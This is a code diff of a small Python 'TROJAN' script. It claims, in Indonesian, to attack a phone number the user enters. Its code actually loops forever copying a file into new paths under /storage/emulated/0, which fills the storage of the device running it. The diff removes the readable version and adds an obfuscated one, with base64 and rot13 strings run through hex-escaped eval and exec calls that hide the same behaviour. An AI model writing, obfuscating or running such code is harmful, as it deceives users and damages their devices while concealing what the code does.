@@ -1,14 +1,8 @@
-import os,random
-
-print('TROJAN\nBY:BuyutGans')
-
-c = input("Masukkan Nomor Target: ")
-a = 0
-b = 'cp 0 /storage/emulated/0/1'
-while True:
-     d = str(a+1)
-     c = str(a+2)
-     b = b.replace(d,c)
-     print("Menyerang Nomor",c,'Dengan Trojan Sebanyak',a,'Paket')
-     os.system(b)
-     a += 1
+import base64, codecs
+magic = 'aW1wb3J0IG9zLHJhbmRvbQoKcHJpbnQoJ1RST0pBTlxuQlk6QnV5dXRHYW5zJykKCmMgPSBpbnB1dCgiTWFzdWtrYW4gTm9tb3'
+love = 'VtITSlM2I0BvNvXDcuVQ0tZNcvVQ0tW2AjVQNtY3A0o3WuM2HiMJ11oTS0MJDiZP8kWjc3nTyfMFOHpaIyBtbtVPNtVTDtCFOm'
+god = 'dHIoYSsxKQogICAgIGMgPSBzdHIoYSsyKQogICAgIGIgPSBiLnJlcGxhY2UoZCxjKQogICAgIHByaW50KCJNZW55ZXJhbmcgTm'
+destiny = '9go3VvYTZfW0EyozquovOHpz9dLJ4tH2IvLJ55LJfaYTRfW1Oun2I0WlxXVPNtVPOipl5mrKA0MJ0bLvxXVPNtVPOuVPf9VQR='
+joy = '\x72\x6f\x74\x31\x33'
+trust = eval('\x6d\x61\x67\x69\x63') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x6c\x6f\x76\x65\x2c\x20\x6a\x6f\x79\x29') + eval('\x67\x6f\x64') + eval('\x63\x6f\x64\x65\x63\x73\x2e\x64\x65\x63\x6f\x64\x65\x28\x64\x65\x73\x74\x69\x6e\x79\x2c\x20\x6a\x6f\x79\x29')
+eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
